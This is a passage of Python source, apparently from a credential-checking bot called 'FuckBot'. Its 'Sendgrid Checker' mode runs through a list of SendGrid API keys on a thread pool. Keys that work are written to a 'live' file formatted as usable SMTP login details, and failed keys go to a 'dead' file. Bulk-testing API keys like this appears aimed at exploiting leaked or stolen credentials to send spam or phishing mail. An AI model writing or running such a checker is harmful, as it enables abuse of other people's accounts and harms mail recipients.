                build_sendgrid  = "SMTP Host     : smtp.sendgrid.net\n"
                build_sendgrid += "SMTP Port     : 587\n"
                build_sendgrid += "SMTP Username : apikey\n"
                build_sendgrid += "SMTP Password : %s\n" % api_key
                build_sendgrid += "SMTP From     : %s\n" % get_from
                append_sendgrid = self.join_string(build_sendgrid)
                
                self.write_file(sendgrid_live, append_sendgrid)
                
                
            except:
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=api_key,
                    message="Dead",
                    status=False,
                    mode="Sendgrid Checker"
                )
                self.write_file(sendgrid_dead, api_key)
            
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    
    def run_bot(self, bot_mode, input_list, num_threads):
        try:
            load_list    = self.get_file(input_list)
            list_value   = load_list["list"]
            list_length  = load_list["length"]
            list_counter = 0
            self.show_info_message(message="Starting %s Jobs with %s Workers" % (list_length, num_threads))
            pool = ThreadPool(int(num_threads))
            for data in list_value:
                list_counter = list_counter + 1
                try:
                    iterable = (str(list_counter), str(list_length), str(data))
                    pool.add_task(self.map_helper, bot_mode, iterable)
                except (SystemExit, KeyboardInterrupt):
                    self.show_error_message("Task Cancelled")
            pool.wait_completion()
        except KeyboardInterrupt:
            self.show_error_message("Caught Keyboard Interrupt, Terminating Workers")
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

# executor
if __name__ == '__main__':
    run = FuckBot()